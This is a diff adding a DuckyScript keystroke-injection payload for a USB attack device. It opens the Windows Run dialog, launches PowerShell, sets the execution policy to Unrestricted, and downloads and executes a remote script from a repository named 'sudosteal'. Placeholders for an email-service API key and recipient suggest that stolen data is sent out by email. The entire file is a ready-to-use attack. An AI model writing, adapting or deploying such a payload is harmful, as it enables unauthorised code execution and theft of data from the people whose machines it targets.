@@ -1,0 +1,21 @@
+REM --- Initial Delay to Ensure System Readiness ---
+DELAY 1000
+
+REM --- Open Run Dialog (Win + R) ---
+GUI r
+DELAY 500
+
+REM --- Launch PowerShell ---
+STRING powershell
+ENTER
+DELAY 1000
+
+REM --- Set Execution Policy and Execute Remote Payload Script ---
+REM Replace <PUT-YOUR-RESEND-API-KEY> and <PUT YOUR EMAIL HERE> with actual values before running
+STRING Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force -Command "$apiKey = '<PUT-YOUR-RESEND-API-KEY>'; $recipient = '<PUT YOUR EMAIL HERE>'; Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mzotic/sudosteal/refs/heads/main/scripts/windows_payload.ps1').Content"
+ENTER
+DELAY 1000
+
+REM --- Exit PowerShell ---
+STRING exit
+ENTER
